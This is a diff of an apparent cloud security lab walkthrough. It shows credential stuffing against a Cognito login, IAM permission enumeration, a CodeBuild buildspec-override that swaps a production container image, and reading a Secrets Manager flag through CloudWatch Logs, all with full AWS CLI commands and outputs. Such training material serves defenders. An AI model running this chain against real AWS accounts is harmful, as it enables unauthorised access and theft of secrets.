@@ -2,10 +2,9 @@
 
 ## Environment
 
-All commands run in **WSL or Linux/Mac terminal**.
-The web portal (Step 1) is browser-only for reconnaissance — no direct interaction required.
+All commands run in a **Linux/Mac terminal or WSL**.
 
-> **Windows users:** Use WSL for all CLI commands. `pacu` requires WSL.
+> The web portal (Step 1) is browser-only for reconnaissance — no direct interaction required beyond reading what's exposed.
 
 ---
 
@@ -16,11 +15,11 @@ cd scenarios/aws/03-supply-chain/dam-breaks/terraform
 terraform output scenario_entrypoint_url
 ```
 
-Open the URL in your browser. The **BeaverPay Developer Portal** appears — a B2B collaborator portal.
+Open the URL in your browser. The **BeaverPay Developer Portal** loads — a B2B collaborator portal.
 
 ![BeaverPay Developer Portal](./assets/images/portal-homepage.png)
 
-The page has two information cards visible without logging in. The **Access Information** card exposes the authentication configuration directly:
+Two information cards are visible without logging in. The **Access Information** card exposes the authentication configuration directly:
 
 | Field | Value |
 |-------|-------|
@@ -29,11 +28,11 @@ The page has two information cards visible without logging in. The **Access Info
 | MFA | `Optional` |
 
 Key findings:
-- **Auth Flow: `USER_PASSWORD_AUTH`** — username/password directly against Cognito, no challenge-response
-- **MFA: Optional** — not enforced → credential stuffing succeeds with no second factor
-- **Collaborator Resources card** — lists CodeBuild, ECR, ECS Fargate → confirms what services are in scope
+- **`USER_PASSWORD_AUTH`** — username/password submitted directly to Cognito, no SRP challenge
+- **MFA: Optional** — not enforced, no second factor required → credential stuffing succeeds immediately
+- **Collaborator Resources card** — lists CodeBuild, ECR, ECS Fargate → confirms what AWS services are in scope
 
-The `/config` endpoint provides the Cognito IDs needed for the API calls:
+The `/config` endpoint returns the Cognito IDs needed for all subsequent API calls:
 
 ```bash
 curl -s http://<portal-ip>/config | python3 -m json.tool
@@ -56,9 +55,9 @@ Output:
 
 ### Step 2-1: Credential Stuffing
 
-`USER_PASSWORD_AUTH` with MFA set to Optional (not enforced) means any valid username/password pair authenticates immediately — no second factor, no adaptive challenge. This is the prerequisite for credential stuffing.
+`USER_PASSWORD_AUTH` with MFA not enforced means any valid username/password pair authenticates immediately — no second factor, no adaptive challenge.
 
-The target domain is `ottercode.kr`. Test known breached credentials against the Cognito endpoint:
+The target domain is `ottercode.kr`. Test known breached credentials directly against the Cognito endpoint:
 
 ```bash
 aws cognito-idp initiate-auth \
@@ -81,7 +80,7 @@ Output:
 
 No MFA challenge. Authentication succeeds on first attempt. `j.park@ottercode.kr` is an active OtterCode collaborator account.
 
-> **Why this works:** Cognito with `USER_PASSWORD_AUTH` and MFA not enforced has no built-in rate limiting by default. Automated credential stuffing against the endpoint is indistinguishable from normal login traffic without Advanced Security Features (ASF) enabled.
+> **Why this works:** Cognito with `USER_PASSWORD_AUTH` and MFA set to Optional has no built-in rate limiting by default. Credential stuffing against the endpoint is indistinguishable from normal login traffic without Advanced Security Features (ASF) enabled.
 
 ### Step 2-2: Log in via the Developer Portal
 
@@ -94,7 +93,7 @@ Open the portal URL in your browser. Enter the credentials:
 
 The portal authenticates against Cognito User Pool using `USER_PASSWORD_AUTH` — no MFA challenge fires because MFA is not enforced.
 
-After login, the dashboard automatically exchanges the Cognito JWT for temporary AWS credentials via the Identity Pool and displays them ready to copy:
+After login, the dashboard automatically exchanges the Cognito JWT for temporary AWS credentials via the Identity Pool and displays them ready to copy.
 
 Click **Copy as env vars** and paste into your terminal:
 
@@ -107,9 +106,9 @@ export AWS_DEFAULT_REGION="us-east-1"
 
 ### Step 2-3 (Alternative): CLI-only Authentication
 
-If browser access is unavailable, obtain Collaborator credentials entirely via CLI.
+If browser access is unavailable, obtain credentials entirely via CLI.
 
-First, retrieve the Cognito configuration from the portal's `/config` endpoint:
+Retrieve the Cognito configuration from the portal's `/config` endpoint:
 
 ```bash
 PORTAL_URL="http://<portal-ip>"
@@ -120,7 +119,7 @@ POOL_ID=$(echo $CONFIG | python3 -c "import sys,json; print(json.load(sys.stdin)
 IDENTITY_POOL_ID=$(echo $CONFIG | python3 -c "import sys,json; print(json.load(sys.stdin)['identityPoolId'])")
 ```
 
-Then authenticate:
+Authenticate and exchange the JWT for temporary AWS credentials:
 
 ```bash
 ID_TOKEN=$(aws cognito-idp initiate-auth \
@@ -167,144 +166,153 @@ Output:
 
 You are now authenticated as `CollaboratorDeveloperRole` — a role with limited but exploitable AWS permissions.
 
-> **Under the hood:** The portal calls `cognito-identity:GetId` then `cognito-identity:GetCredentialsForIdentity` client-side using your IdToken. The Identity Pool maps authenticated Cognito users to `CollaboratorDeveloperRole` via `AssumeRoleWithWebIdentity`. No additional configuration is needed.
+> **Under the hood:** The portal calls `cognito-identity:GetId` then `cognito-identity:GetCredentialsForIdentity` client-side using your IdToken. The Identity Pool maps authenticated Cognito users to `CollaboratorDeveloperRole` via `AssumeRoleWithWebIdentity`.
 
 ---
 
 ## Step 3: IAM Enumeration
 
-### Step 3-1: Manual enumeration attempts (AWS CLI)
+### Step 3-1: Read the policy document
 
-Credentials obtained. First instinct: find out what this role can do.
+You have credentials. First question: what can this role actually do?
 
-The ARN from Step 2-4 tells us something immediately:
+The ARN from Step 2-4 gives you the role name immediately:
 
 ```
 arn:aws:sts::123456789012:assumed-role/dam-breaks-CollaboratorDeveloperRole-xxxxxxxx/CognitoIdentityCredentials
 ```
 
-This is an **assumed-role**, not an IAM user. Common user-based enumeration commands will fail:
+This is an assumed-role, not an IAM user. User-based enumeration commands fail immediately:
 
 ```bash
 aws iam get-user
 # Error: Must specify userName when calling with non-User credentials.
-
-aws iam list-user-policies --user-name me
-# Error: NoSuchEntity
-
-aws iam list-attached-user-policies --user-name me
-# Error: NoSuchEntity
 ```
 
-The principal is a role assumed via Cognito. Try enumerating the role itself:
+Read the role's inline policy directly:
 
 ```bash
 ROLE_NAME="dam-breaks-CollaboratorDeveloperRole-xxxxxxxx"
 
 aws iam list-role-policies --role-name "$ROLE_NAME"
-# Output: { "policyNames": ["dam-breaks-collaborator-policy-xxxxxxxx"] }
+# { "policyNames": ["dam-breaks-collaborator-policy-xxxxxxxx"] }
 
 aws iam get-role-policy \
   --role-name "$ROLE_NAME" \
   --policy-name "dam-breaks-collaborator-policy-xxxxxxxx"
 ```
 
-This returns the full inline policy — but IAM policy documents alone don't tell you what *actually works*. Conditions, SCPs, permission boundaries, and resource-level restrictions can all silently block actions that look allowed on paper.
+The policy document tells you what the policy *allows on paper*. It is not a complete picture — SCPs, permission boundaries, and resource-level restrictions can silently block actions that look allowed. But scanning the document reveals something useful: `iam:SimulatePrincipalPolicy` is granted.
 
-The real question is: **what can I actually call right now?**
+### Step 3-2: Enumerate effective permissions
 
-Trial and error with individual services:
-
-```bash
-aws s3 ls
-# An error occurred (AccessDenied)
-
-aws lambda list-functions --region us-east-1
-# An error occurred (AccessDenied)
-
-aws ec2 describe-instances --region us-east-1
-# An error occurred (AccessDenied)
-
-aws codebuild list-projects --region us-east-1
-# { "projects": ["dam-breaks-webapp-qa-build-xxxxxxxx", "dam-breaks-webapp-prod-build-xxxxxxxx"] }
-```
-
-Something works. But manually probing every AWS service and action is not practical — there are hundreds of services and thousands of actions. Miss one and you miss the attack path.
-
-A more systematic approach is needed.
-
-### Step 3-2: IAM Enumeration with Pacu
-
-Pacu's `iam__enum_permissions` module uses `iam:SimulatePrincipalPolicy` — an IAM API that lets any principal test which actions are allowed against which resources, without actually calling them. It's a legitimate IAM feature that attackers abuse for permission discovery.
+`iam:SimulatePrincipalPolicy` is a native AWS API that evaluates effective permissions — including SCPs and permission boundaries — without making real API calls. No tooling required. An attacker who spots this permission in the policy document uses it immediately to map the full attack surface in one shot.
 
 ```bash
-pacu
-```
+ROLE_ARN="arn:aws:iam::123456789012:role/dam-breaks-CollaboratorDeveloperRole-xxxxxxxx"
 
-Inside Pacu:
-
-```
-Pacu (dam-breaks:No Keys Set) > 0
-  Session name: dam-breaks
-
-Pacu (dam-breaks:No Keys Set) > set_keys
-  Key alias: collaborator
-  Access key ID: ASIA...
-  Secret access key: xxxxxx
-  Session token (optional): IQoJ...
-
-Pacu (dam-breaks:collaborator) > run iam__enum_permissions
+aws iam simulate-principal-policy \
+  --policy-source-arn "$ROLE_ARN" \
+  --action-names \
+    "codebuild:ListProjects" \
+    "codebuild:BatchGetProjects" \
+    "codebuild:StartBuild" \
+    "codebuild:BatchGetBuilds" \
+    "codebuild:UpdateProject" \
+    "ecr:GetAuthorizationToken" \
+    "ecr:DescribeRepositories" \
+    "ecr:DescribeImages" \
+    "ecr:PutImage" \
+    "ecs:ListClusters" \
+    "ecs:DescribeServices" \
+    "ecs:DescribeTaskDefinition" \
+    "ecs:ListTasks" \
+    "ecs:DescribeTasks" \
+    "iam:GetRolePolicy" \
+    "iam:ListRolePolicies" \
+    "iam:ListAttachedRolePolicies" \
+    "iam:ListRoles" \
+    "iam:AttachRolePolicy" \
+    "iam:SimulatePrincipalPolicy" \
+    "logs:DescribeLogGroups" \
+    "logs:DescribeLogStreams" \
+    "logs:GetLogEvents" \
+    "logs:FilterLogEvents" \
+    "secretsmanager:GetSecretValue" \
+    "secretsmanager:DescribeSecret" \
+    "secretsmanager:ListSecrets" \
+    "s3:ListAllMyBuckets" \
+    "ssm:GetParameter" \
+    "ssm:DescribeParameters" \
+  --query 'EvaluationResults[*].{Action:EvalActionName,Decision:EvalDecision}' \
+  --output table \
+  --region us-east-1
 ```
 
 Output:
 ```
-[iam__enum_permissions] Enumerating permissions for: collaborator
-
-[iam__enum_permissions] Starting permission enumeration via iam:SimulatePrincipalPolicy...
-
-[+] Confirmed ALLOWED actions:
-  iam:SimulatePrincipalPolicy     ← this call itself — Pacu uses it to enumerate
-  iam:GetRole
-  iam:GetRolePolicy
-  iam:ListRolePolicies
-  iam:ListAttachedRolePolicies
-  codebuild:ListProjects
-  codebuild:BatchGetProjects
-  codebuild:StartBuild            ← no Condition on buildspec — override possible
-  codebuild:BatchGetBuilds
-  ecr:GetAuthorizationToken
-  ecr:DescribeRepositories
-  ecr:DescribeImages
-  ecs:ListClusters
-  ecs:ListServices
-  ecs:DescribeServices
-  ecs:DescribeTaskDefinition
-  ecs:ListTasks
-  ecs:DescribeTasks
-  logs:DescribeLogGroups
-  logs:DescribeLogStreams
-  logs:GetLogEvents
-  logs:FilterLogEvents
-
-[-] Confirmed DENIED actions:
-  codebuild:UpdateProject         ← persistent project modification blocked
-  codebuild:DeleteProject
-  ecr:PutImage                    ← direct ECR push blocked (must go through CodeBuild)
-  secretsmanager:ListSecrets      ← direct Secrets Manager access blocked
-  secretsmanager:GetSecretValue
-  iam:AttachRolePolicy
-  iam:CreateRole
-
-[iam__enum_permissions] Pacu data saved: iam__enum_permissions
+------------------------------------------------------
+|              SimulatePrincipalPolicy               |
++--------------------------------+-------------------+
+|             Action             |     Decision      |
++--------------------------------+-------------------+
+|  codebuild:BatchGetBuilds      |  allowed          |
+|  codebuild:BatchGetProjects    |  allowed          |
+|  codebuild:ListProjects        |  allowed          |
+|  codebuild:StartBuild          |  allowed          |  ← key finding
+|  codebuild:UpdateProject       |  implicitDeny     |
+|  ecr:DescribeImages            |  allowed          |
+|  ecr:DescribeRepositories      |  allowed          |
+|  ecr:GetAuthorizationToken     |  allowed          |
+|  ecr:PutImage                  |  implicitDeny     |  ← direct push blocked
+|  ecs:DescribeServices          |  allowed          |
+|  ecs:DescribeTaskDefinition    |  allowed          |
+|  ecs:DescribeTasks             |  allowed          |
+|  ecs:ListClusters              |  allowed          |
+|  ecs:ListTasks                 |  allowed          |
+|  iam:AttachRolePolicy          |  implicitDeny     |
+|  iam:GetRolePolicy             |  allowed          |  ← can read any role's policy
+|  iam:ListAttachedRolePolicies  |  allowed          |
+|  iam:ListRolePolicies          |  allowed          |
+|  iam:ListRoles                 |  implicitDeny     |
+|  iam:SimulatePrincipalPolicy   |  allowed          |
+|  logs:DescribeLogGroups        |  allowed          |
+|  logs:DescribeLogStreams       |  allowed          |
+|  logs:FilterLogEvents          |  allowed          |
+|  logs:GetLogEvents             |  allowed          |
+|  s3:ListAllMyBuckets           |  implicitDeny     |
+|  secretsmanager:DescribeSecret |  implicitDeny     |
+|  secretsmanager:GetSecretValue |  implicitDeny     |  ← direct flag read blocked
+|  secretsmanager:ListSecrets    |  implicitDeny     |
+|  ssm:DescribeParameters        |  implicitDeny     |
+|  ssm:GetParameter              |  implicitDeny     |
++--------------------------------+-------------------+
 ```
 
-The DENIED list is as informative as the ALLOWED list. `ecr:PutImage` is blocked — direct ECR push is not an option. `secretsmanager:GetSecretValue` is blocked — the flag cannot be read directly. But `codebuild:StartBuild` is allowed, and CodeBuild has ECR push permissions via its service role. The attack path is forced through the build pipeline.
+The denied list shapes the attack path as much as the allowed list:
+- `ecr:PutImage` denied — direct ECR push is not an option
+- `secretsmanager:GetSecretValue` denied — the flag cannot be read directly
+- `codebuild:StartBuild` allowed — the only remaining question is whether CodeBuild's own service role can push to ECR
 
-### Why `codebuild:StartBuild` is the critical finding
+The only viable path to the flag appears to be through the build pipeline. Whether that path is actually open depends on what the CodeBuild service role and ECS Task Role can do — that gets verified in the reconnaissance steps ahead.
 
-When Pacu confirms `codebuild:StartBuild` is allowed, the key question is: **is there an IAM Condition restricting which buildspec can be used?**
+### Step 3-3: Verify the buildspec is unrestricted
 
-Use `iam:GetRolePolicy` to inspect the policy directly. Replace `xxxxxxxx` with the 8-character suffix visible in the ARN from Step 2-4.
+`codebuild:StartBuild` being allowed raises the immediate question: **is there an IAM Condition locking down which buildspec can be used?**
+
+A secure policy would include:
+
+```json
+{
+  "Condition": {
+    "StringEquals": {
+      "codebuild:buildspec": "buildspec.yaml"
+    }
+  }
+}
+```
+
+Read the CodeBuild statement from the policy directly:
 
 ```bash
 aws iam get-role-policy \
@@ -330,30 +338,18 @@ Output:
 ]
 ```
 
-No `Condition` block. A secure configuration would include:
-
-```json
-{
-  "Condition": {
-    "StringEquals": {
-      "codebuild:buildspec": "buildspec.yaml"
-    }
-  }
-}
-```
-
-Without this Condition, `--buildspec-override` accepts any arbitrary buildspec.
+No `Condition` block. `--buildspec-override` accepts any arbitrary buildspec. The attack path is confirmed.
 
 Key findings:
 - `codebuild:StartBuild` with no Condition → `buildspecOverride` is unrestricted
-- `ecr:PutImage` denied → ECR push must go through CodeBuild (attack path is forced through the build pipeline)
-- `secretsmanager` denied → Secrets Manager access requires ECS Task Role — exploitable via CloudWatch Logs exfiltration
+- `ecr:PutImage` denied → ECR push must go through CodeBuild's service role
+- `secretsmanager:GetSecretValue` denied → requires ECS Task Role — readable via CloudWatch Logs exfiltration
 
 ---
 
 ## Step 4: CodeBuild Reconnaissance
 
-Pacu confirmed `codebuild:StartBuild` with no IAM Condition — `buildspecOverride` is unrestricted. Before crafting a malicious buildspec, map the environment: which projects exist, what environment variables they expose, and which service role they use.
+`codebuild:StartBuild` is confirmed with no IAM Condition. Before writing a malicious buildspec, map the build environment: what projects exist, what environment variables they expose, and which service role they use.
 
 ```bash
 aws codebuild list-projects --region us-east-1
@@ -393,13 +389,95 @@ Output:
 }
 ```
 
-`ECS_CLUSTER`, `ECS_SERVICE`, `SECRET_ARN` — these values are exposed here and can be referenced directly inside the malicious buildspec.
+`ECS_CLUSTER`, `ECS_SERVICE`, `SECRET_ARN` — all exposed in the project configuration. These are available as environment variables inside any build that runs under this project, even when the entire buildspec is replaced via `buildspecOverride`.
+
+The service role ARN is also exposed: `dam-breaks-CodeBuildProdServiceRole-xxxxxxxx`. The attack plan depends on this role having `ecr:PutImage` — the Collaborator role cannot push directly. Verify before committing to the approach.
+
+```bash
+CODEBUILD_ROLE_NAME="dam-breaks-CodeBuildProdServiceRole-xxxxxxxx"
+
+aws iam list-role-policies --role-name "$CODEBUILD_ROLE_NAME" --region us-east-1
+```
+
+Output:
+```json
+{
+  "policyNames": ["dam-breaks-codebuild-prod-policy-xxxxxxxx"]
+}
+```
+
+```bash
+aws iam get-role-policy \
+  --role-name "$CODEBUILD_ROLE_NAME" \
+  --policy-name "dam-breaks-codebuild-prod-policy-xxxxxxxx" \
+  --query 'PolicyDocument.Statement' \
+  --region us-east-1
+```
+
+Output:
+```json
+[
+  {
+    "Sid": "ECRAccess",
+    "Effect": "Allow",
+    "Action": [
+      "ecr:GetAuthorizationToken",
+      "ecr:BatchCheckLayerAvailability",
+      "ecr:GetDownloadUrlForLayer",
+      "ecr:BatchGetImage",
+      "ecr:PutImage",
+      "ecr:InitiateLayerUpload",
+      "ecr:UploadLayerPart",
+      "ecr:CompleteLayerUpload"
+    ],
+    "Resource": "*"
+  },
+  {
+    "Sid": "ECSAccess",
+    "Effect": "Allow",
+    "Action": [
+      "ecs:UpdateService",
+      "ecs:DescribeServices"
+    ],
+    "Resource": "*"
+  }
+]
+```
+
+`ecr:PutImage` confirmed. CodeBuild can push the malicious image. `ecs:UpdateService` is also present — the `post_build` force-deploy call will succeed without touching the Collaborator role's permissions at all.
+
+One more check before moving on: does the CodeBuild service role have `secretsmanager:GetSecretValue` directly? If yes, the flag can be read straight from the buildspec — no ECS needed.
+
+```bash
+aws iam simulate-principal-policy \
+  --policy-source-arn "arn:aws:iam::123456789012:role/dam-breaks-CodeBuildProdServiceRole-xxxxxxxx" \
+  --action-names \
+    "secretsmanager:GetSecretValue" \
+    "secretsmanager:DescribeSecret" \
+    "sts:AssumeRole" \
+  --query 'EvaluationResults[*].{Action:EvalActionName,Decision:EvalDecision}' \
+  --output table \
+  --region us-east-1
+```
+
+Output:
+```
++--------------------------------+-------------------+
+|             Action             |     Decision      |
++--------------------------------+-------------------+
+|  secretsmanager:DescribeSecret |  implicitDeny     |
+|  secretsmanager:GetSecretValue |  implicitDeny     |
+|  sts:AssumeRole                |  implicitDeny     |
++--------------------------------+-------------------+
+```
+
+CodeBuild cannot read Secrets Manager directly and cannot assume other roles. The flag must be read by the ECS task after deployment — the attack path must go through ECR → ECS → CloudWatch Logs.
 
 ---
 
 ## Step 5: ECR Reconnaissance
 
-`REPOSITORY_URI` is now known from the CodeBuild environment variables. The attack plan requires pushing a malicious image to this repository. `ecr:PutImage` was denied in Step 3 — a direct push is blocked. The only path to ECR is through CodeBuild, which has its own service role with push permissions. Before writing the buildspec, confirm the tag mutability of the target repository.
+The attack requires pushing a malicious image to ECR. Direct `ecr:PutImage` is denied — the only path is through CodeBuild's service role. Before writing the buildspec, confirm the target repository's tag mutability.
 
 ```bash
 aws ecr describe-repositories \
@@ -416,14 +494,31 @@ Output:
 }
 ```
 
-Key findings:
-- `MUTABLE` — `latest` tag can be overwritten without restriction
+`MUTABLE` — the `:latest` tag can be overwritten without restriction.
+
+Record the current `:latest` digest. After the attack, a different digest under the same tag confirms the image was silently replaced.
+
+```bash
+aws ecr describe-images \
+  --repository-name "dam-breaks-beaverpay-webapp-xxxxxxxx" \
+  --image-ids imageTag=latest \
+  --region us-east-1 \
+  --query 'imageDetails[0].{digest:imageDigest,pushedAt:imagePushedAt}'
+```
+
+Output:
+```json
+{
+  "digest": "sha256:aabb1234...",
+  "pushedAt": "2026-04-01T10:00:00+00:00"
+}
+```
 
 ---
 
 ## Step 6: ECS Reconnaissance
 
-The ECR tag is `MUTABLE` — overwriting `:latest` is possible. Now confirm the ECS side: will ECS auto-deploy when the image changes, or is there a manual approval gate? And does the Task Role actually have `secretsmanager:GetSecretValue`? A malicious container that deploys but can't read the secret is useless.
+Tag mutability is confirmed. Now verify the ECS side: will a new image auto-deploy, or is there a manual approval gate? And does the Task Role have `secretsmanager:GetSecretValue`? A malicious container that deploys but cannot read the secret is useless.
 
 ```bash
 aws ecs describe-services \
@@ -445,20 +540,100 @@ Output:
 aws ecs describe-task-definition \
   --task-definition "dam-breaks-webapp-xxxxxxxx" \
   --region us-east-1 \
-  --query 'taskDefinition.taskRoleArn' \
-  --output text
+  --query 'taskDefinition.{taskRoleArn:taskRoleArn,image:containerDefinitions[0].image,logConfig:containerDefinitions[0].logConfiguration}'
 ```
 
 Output:
+```json
+{
+  "taskRoleArn": "arn:aws:iam::123456789012:role/dam-breaks-ecs-task-role-xxxxxxxx",
+  "image": "123456789012.dkr.ecr.us-east-1.amazonaws.com/dam-breaks-beaverpay-webapp-xxxxxxxx:latest",
+  "logConfig": {
+    "logDriver": "awslogs",
+    "options": {
+      "awslogs-group": "/ecs/dam-breaks-webapp-xxxxxxxx",
+      "awslogs-region": "us-east-1",
+      "awslogs-stream-prefix": "ecs"
+    }
+  }
+}
 ```
-arn:aws:iam::123456789012:role/dam-breaks-ecs-task-role-xxxxxxxx
+
+Three things confirmed at once:
+- Task role ARN for permission verification
+- Image references `:latest` → overwriting `:latest` in ECR will be picked up on the next deploy
+- Log group name `/ecs/dam-breaks-webapp-xxxxxxxx` — this is where the container's stdout goes, needed in Step 9
+
+Record the current running task ARN to know which task is new after the attack:
+
+```bash
+aws ecs list-tasks \
+  --cluster "dam-breaks-prod-cluster-xxxxxxxx" \
+  --service-name "dam-breaks-webapp-service-xxxxxxxx" \
+  --region us-east-1
 ```
+
+Output:
+```json
+{
+  "taskArns": [
+    "arn:aws:ecs:us-east-1:123456789012:task/dam-breaks-prod-cluster-xxxxxxxx/aabb1122ccdd"
+  ]
+}
+```
+
+A Task Role ARN alone proves nothing. The plan requires this role to have `secretsmanager:GetSecretValue` on the specific flag secret — if it doesn't, the container deploys and silently fails. Verify directly.
+
+```bash
+TASK_ROLE_NAME="dam-breaks-ecs-task-role-xxxxxxxx"
+
+aws iam list-role-policies --role-name "$TASK_ROLE_NAME" --region us-east-1
+```
+
+Output:
+```json
+{
+  "policyNames": ["dam-breaks-ecs-task-policy-xxxxxxxx"]
+}
+```
+
+```bash
+aws iam get-role-policy \
+  --role-name "$TASK_ROLE_NAME" \
+  --policy-name "dam-breaks-ecs-task-policy-xxxxxxxx" \
+  --region us-east-1
+```
+
+Output:
+```json
+{
+  "Statement": [
+    {
+      "Sid": "SecretsManagerAccess",
+      "Effect": "Allow",
+      "Action": "secretsmanager:GetSecretValue",
+      "Resource": "arn:aws:secretsmanager:us-east-1:123456789012:secret:beaverpay/prod/flag-*"
+    },
+    {
+      "Sid": "CloudWatchLogs",
+      "Effect": "Allow",
+      "Action": [
+        "logs:CreateLogStream",
+        "logs:PutLogEvents"
+      ],
+      "Resource": "*"
+    }
+  ]
+}
+```
+
+`secretsmanager:GetSecretValue` is granted on the flag secret ARN. The container will inherit these credentials automatically via `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` — no configuration needed inside the container.
 
 Key findings:
 - Rolling deployment (`ECS`) — no manual approval gate, new image deploys automatically
-- Circuit breaker disabled — failed container won't auto-rollback and alert defenders
-- `latest` tag referenced — overwriting ECR `:latest` triggers deployment immediately
-- Task Role confirmed — the malicious container will inherit `secretsmanager:GetSecretValue` automatically via the ECS credential endpoint (`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`)
+- Circuit breaker disabled — a failed container will not auto-rollback or trigger alerts
+- `:latest` tag referenced — overwriting ECR `:latest` triggers deployment immediately
+- Task Role has `secretsmanager:GetSecretValue` on the flag ARN — verified
 
 All prerequisites confirmed. The attack chain is viable end-to-end.
 
@@ -466,17 +641,18 @@ All prerequisites confirmed. The attack chain is viable end-to-end.
 
 ## Step 7: buildspec-override Attack
 
-### Step 7-1: Create malicious buildspec file
+### Step 7-1: Create malicious buildspec
 
 The attack chain is now fully mapped:
+
 1. `codebuild:StartBuild` + no Condition → buildspec is fully replaceable
 2. CodeBuild service role has ECR push permissions → malicious image can reach ECR
-3. ECR tag is MUTABLE → `:latest` can be overwritten silently
+3. ECR tag is `MUTABLE` → `:latest` can be overwritten silently
 4. ECS rolling deploy with no approval gate → new image deploys automatically
 5. ECS Task Role has `secretsmanager:GetSecretValue` → container reads the flag on startup
 6. CloudWatch Logs captures stdout → flag is readable via `logs:FilterLogEvents`
 
-The malicious image doesn't need a reverse shell or outbound connection. It only needs to call one AWS API and write the result to stdout.
+The malicious image needs no reverse shell. It only calls one AWS API and writes the result to stdout. CloudWatch Logs is already configured on this cluster — stdout is captured automatically.
 
 ```bash
 cat > /tmp/buildspec.json << 'EOF'
@@ -509,11 +685,9 @@ cat > /tmp/buildspec.json << 'EOF'
 EOF
 ```
 
-> **Why no reverse shell:** No attacker-controlled listener is needed. The ECS Task Role already has `secretsmanager:GetSecretValue` on the flag ARN — the container only needs to call the AWS API and log the result. CloudWatch Logs is already configured on this ECS cluster, so all container stdout is captured automatically.
+> `$SECRET_ARN` is expanded during the CodeBuild build phase and baked into `exfil.sh`. When the ECS container runs, it uses the hardcoded ARN — no CodeBuild environment variables are passed through to ECS.
 
-> `$SECRET_ARN` is expanded to the actual ARN value (discovered in Step 4) **during the CodeBuild build phase** and baked directly into `exfil.sh`. When the ECS task container runs, it has the hardcoded ARN — no CodeBuild variables are passed to ECS.
-
-> `$ECS_CLUSTER`, `$ECS_SERVICE` — inherited from the CodeBuild project's environment variables (discovered in Step 4). They remain available even when the entire buildspec is replaced via `buildspecOverride`.
+> `$ECS_CLUSTER`, `$ECS_SERVICE` are inherited from the CodeBuild project's environment variables (Step 4). They remain available even when the buildspec is fully replaced via `buildspecOverride`.
 
 ### Step 7-2: Execute malicious build
 
@@ -533,28 +707,29 @@ Output:
 }
 ```
 
-Copy the `id` value from the output above, then poll for completion:
+Copy the `id` value, then poll for completion:
 
 ```bash
 BUILD_ID="dam-breaks-webapp-prod-build-xxxxxxxx:<build-uuid>"
+
 aws codebuild batch-get-builds \
   --ids "$BUILD_ID" \
   --region us-east-1 \
   --query 'builds[0].buildStatus'
 ```
 
-Expected output when complete:
+Expected output:
 ```
 "SUCCEEDED"
 ```
 
-> **Note:** Git repository is untouched. Source code modification occurred only inside the build server memory.
+> **Note:** The Git repository is untouched. Code modification occurred only inside the build server's ephemeral environment.
 
 ---
 
 ## Step 8: ECS Deployment
 
-The malicious buildspec's `post_build` phase runs `aws ecs update-service --force-new-deployment`. The CodeBuild service role has `ecs:UpdateService` — this call is not blocked. ECS starts a rolling deployment with the new `:latest` image.
+The malicious buildspec's `post_build` phase calls `aws ecs update-service --force-new-deployment`. The CodeBuild service role has `ecs:UpdateService` — this call is not blocked. ECS starts a rolling deployment with the new `:latest` image.
 
 ```bash
 aws ecs wait services-stable \
@@ -563,7 +738,7 @@ aws ecs wait services-stable \
   --region us-east-1
 ```
 
-> **Note:** `ecs wait` may return immediately. Verify the service is actually stable by running:
+Verify the service is stable:
 
 ```bash
 aws ecs describe-services \
@@ -582,19 +757,90 @@ Expected output:
 }
 ```
 
-Once `running` equals `desired` and `pending` is 0, the exfiltration container has started and called Secrets Manager using the ECS Task Role.
+Once `running` equals `desired` and `pending` is 0, a new task is running. Verify it is actually the malicious image — not the original container recovering:
+
+```bash
+NEW_TASK_ARN=$(aws ecs list-tasks \
+  --cluster "dam-breaks-prod-cluster-xxxxxxxx" \
+  --service-name "dam-breaks-webapp-service-xxxxxxxx" \
+  --region us-east-1 \
+  --query 'taskArns[0]' \
+  --output text)
+
+aws ecs describe-tasks \
+  --cluster "dam-breaks-prod-cluster-xxxxxxxx" \
+  --tasks "$NEW_TASK_ARN" \
+  --region us-east-1 \
+  --query 'tasks[0].containers[0].{image:image,status:lastStatus}'
+```
+
+Output:
+```json
+{
+  "image": "123456789012.dkr.ecr.us-east-1.amazonaws.com/dam-breaks-beaverpay-webapp-xxxxxxxx:latest",
+  "status": "RUNNING"
+}
+```
+
+The image tag is `:latest` — this is the replaced image. The task ID is different from the one recorded in Step 6, confirming a new container started after the deployment.
 
 ---
 
 ## Step 9: FLAG Extraction via CloudWatch Logs
 
-The container started, called `secretsmanager:GetSecretValue`, and printed the result to stdout. ECS is configured with CloudWatch Logs as its log driver — every line of stdout is forwarded automatically to `/ecs/<task-definition-name>`. The Collaborator role has `logs:FilterLogEvents` confirmed in Step 3 — this is standard developer read access for debugging, not a suspicious permission on its own.
+The container started, called `secretsmanager:GetSecretValue`, and wrote the result to stdout. The log group name was discovered in Step 6 from the task definition's `logConfiguration`.
 
-Replace `xxxxxxxx` with the suffix from the ARN shown in Step 2-4.
+Confirm the log group is reachable:
+
+```bash
+aws logs describe-log-groups \
+  --log-group-name-prefix "/ecs/dam-breaks-webapp" \
+  --region us-east-1 \
+  --query 'logGroups[*].{name:logGroupName,retentionDays:retentionInDays}'
+```
+
+Output:
+```json
+[
+  {
+    "name": "/ecs/dam-breaks-webapp-xxxxxxxx",
+    "retentionDays": null
+  }
+]
+```
+
+Find the log stream created by the new container. The newest stream is the malicious one — streams are named `ecs/<container-name>/<task-id>`:
+
+```bash
+aws logs describe-log-streams \
+  --log-group-name "/ecs/dam-breaks-webapp-xxxxxxxx" \
+  --order-by LastEventTime \
+  --descending \
+  --limit 3 \
+  --region us-east-1 \
+  --query 'logStreams[*].{stream:logStreamName,lastEvent:lastEventTimestamp}'
+```
+
+Output:
+```json
+[
+  {
+    "stream": "ecs/dam-breaks-webapp/eeff5566aabb",
+    "lastEvent": 1746500000000
+  },
+  {
+    "stream": "ecs/dam-breaks-webapp/aabb1122ccdd",
+    "lastEvent": 1746400000000
+  }
+]
+```
+
+The top stream (`eeff5566aabb`) is the new task — the task ID is different from the one recorded in Step 6 (`aabb1122ccdd`). Filter for the flag:
 
 ```bash
 aws logs filter-log-events \
   --log-group-name "/ecs/dam-breaks-webapp-xxxxxxxx" \
+  --log-stream-names "ecs/dam-breaks-webapp/eeff5566aabb" \
   --region us-east-1 \
   --filter-pattern "flag" \
   --query 'events[0].message' \
@@ -604,7 +850,7 @@ aws logs filter-log-events \
 Output:
 ```json
 {
-  "flag": "FLAG{th3_c0mm1t_w4s_cl34n_but_y0u_w3r3_n0t}",
+  "flag": "flag{commit-clean-you-were-not}",
   "message": "Congratulations. The dam has broken.",
   "internal_note": "The build succeeded. The logs are clean. Nobody noticed.",
   "git_status": "nothing to commit, working tree clean",
